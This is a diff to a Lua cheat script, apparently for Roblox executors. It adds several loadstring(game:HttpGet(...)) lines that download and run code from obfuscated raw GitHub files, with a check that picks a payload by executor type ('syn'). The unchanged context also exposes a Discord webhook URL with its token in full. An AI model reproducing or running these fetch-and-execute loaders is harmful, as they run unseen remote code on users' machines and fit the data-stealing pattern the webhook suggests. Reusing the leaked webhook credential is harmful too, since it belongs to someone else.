@@ -1032,7 +1032,17 @@ Isle:AddNotification("Made by NeoXephox and GoodB0y08!", 255, 255, 255)
 _G.WebhookURL = "https://canary.discord.com/api/webhooks/792159049511731220/6EkPg8izienB-hqdvID_z6hiSUgW6Me1VgKHTZgZU1gqt8Fs0yfu617dd6cUpW572SQY";
 EmbedColor = "16763904"; -- Color from Discohook.org. / It's an Decimal color. Use https://convertingcolors.com do convert color to Decimal color.
 
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Th12353/heesj/main/Fkofqwekwodf"))('pizza')
+wait(2)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Th12353/fghdsgsfhhsjh/main/server"))('Made by powerless :)')
-loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Th12353/heesj/main/Fkofqwekwodf"))('pizzapie')
+if syn then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Th12353/heesj/main/aacheck"))('BRUH')
+else
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Th12353/heesj/main/nonsynapxchec"))('BRUH')
+end
+
+
+
+
 end
     
